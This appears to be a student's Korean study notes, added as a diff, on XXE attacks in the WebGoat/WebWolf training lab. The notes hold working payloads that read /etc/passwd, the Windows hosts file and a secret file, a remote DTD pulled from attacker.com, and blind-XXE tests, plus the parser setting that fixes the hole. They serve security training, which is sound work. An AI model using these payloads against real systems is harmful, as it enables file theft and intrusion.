@@ -1,0 +1,150 @@
+http://localhost:8080/WebGoat
+http://127.0.0.1:8080/WebGoat
+http://192.168.0.10:8080/WebGoat
+C:/Windows/System32/drivers/etc/hosts 파일은 내부네트워크 dns역할을 함
+hosts파일에 dns를 등록한 후 ipconfig /flushdns
+
+host.docker.internal:8080/WebGoat
+kubernetes.docker.internal:8080/WebGoat
+
+##내부 엔터티 (Internal Entity)
+<!DOCTYPE note [
+  <!ENTITY writer "홍길동">
+]>
+<note>
+  <to>&writer;</to>
+</note>
+
+결과:<to>홍길동</to>
+
+##외부 엔터티 (External Entity)
+<!DOCTYPE note [
+  <!ENTITY ext SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<note>
+  <content>&ext;</content>
+</note>
+
+##파라미터 엔터티 (Parameter Entity)
+<!DOCTYPE note [
+  <!ENTITY % param SYSTEM "http://attacker.com/malicious.dtd">
+  %param;
+]>
+
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+##sample.dtd
+<!ENTITY send "Hello, Blind XXE Study!">
+
+WefWolf 네트워크 상에 해당 파일을 업로드 후 링크파일 확인
+http://localhost:9090/files/webgoat/sample.dtd
+
+##attach
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % extDTD SYSTEM "http://localhost:9090/files/webgoat/sample.dtd">
+  %extDTD;
+]>
+<data>
+  <message>&send;</message>
+</data>
+
+##XEE 3번 문제
+<?xml version="1.0"?>
+<!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///"> ]>
+<comment>  
+<text>&rootpath;</text>
+</comment>
+
+윈도우에서 경로
+<!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///c:/"> ]>
+
+추가공격사항
+<!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "../"> ]>
+
+보안수정코드위치
+C:\Users\admin\Documents\workspace-spring-tools-for-eclipse-4.31.0.RELEASE\WebGoat-8.2.2\webgoat-lessons\xxe\src\main\java\org\owasp\webgoat\xxe\Comments.java
+100번째 줄 xif.setProperty(XMLInputFactory.SUPPORT_DTD, "false");
+var xsr = xif.createXMLStreamReader(new StringReader(xml));
+
+C:\Users\admin\Documents\workspace-spring-tools-for-eclipse-4.31.0.RELEASE\WebGoat-8.2.2\webgoat-lessons\xxe\src\main\java\org\owasp\webgoat\xxe\SimpleXXE.java
+82번째 줄
+catch (Exception e) {
+            //error = ExceptionUtils.getFullStackTrace(e);
+        	throw new IllegalStateException("XML is not vaild",e);
+        }
+
+##XEE 7번 문제
+<?xml version="1.0" standalone="yes" ?>
+<!DOCTYPE comment [
+  <!ELEMENT comment (#PCDATA)>
+  <!ENTITY js SYSTEM "file:///c:/">
+]>
+<comment><text>&js;</text></comment>
+위의 코드를 변형한 후에 Content-Type: application/json ->Content-Type: application/xml
+
+##XEE 11번 문제
+#첫번째 테스트 사항[직접 값을 입력 처리]
+#webwolf에서 sample.dtd등록
+<!ENTITY send "Hello, Blind XXE Study!">
+
+#공격코드
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % extDTD SYSTEM "http://localhost:9090/files/webgoat/sample.dtd">
+  %extDTD;
+]>
+<comment>
+<text>&send;</text>
+</comment>
+
+#두번째 테스트 사항[파일 값을 입력 처리]
+#webwolf에서 file.dtd등록
+<!ENTITY send SYSTEM "file:///C:/Users/admin/.webgoat-8.2.1-SNAPSHOT/XXE/secret.txt">
+
+#공격코드
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % extDTD SYSTEM "http://localhost:9090/files/webgoat/file.dtd">
+  %extDTD;
+]>
+<comment>
+<text>&send;</text>
+</comment>
+
+결론 : 파일의 내용이 출력되지 않음
+1. 웹서버 설정과 보안 제한
+2. 파서 보안 설정
+3. HTTP 요청 제한
+4. 파일 경로와 서버 설정
+5. WebGoat의 보안 설정
+6. WebWolf의 파일 경로 접근
+
+#세번째 테스트 사항[파일명을 제외한 후 확인]
+#file2.dtd 파일 만들기
+<!ENTITY send SYSTEM "file:///C:/Users/admin/.webgoat-8.2.1-SNAPSHOT/XXE">
+
+#webwolf에서 file2.dtd등록
+
+#공격코드
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % extDTD SYSTEM "http://localhost:9090/files/webgoat/file2.dtd">
+  %extDTD;
+]>
+<comment>
+<text>&send;</text>
+</comment>
+
+결론 : 폴더안에 있는 파일리스트중 파일명은 정상적으로 로드되는 것을 확인
+2번째 테스트에서 파일을 인식하지 못하는 것은 아니며 데이터를 로드할 수 없는 문제
+
+과제 : 두번째 코드를 활용하여 파일의 내용을 웹페이지의 입력되도록 처리하시오.
+
+
+참고사항)
+http://localhost:8080/WebGoat/start.mvc#lesson/XXE.lesson/3
+
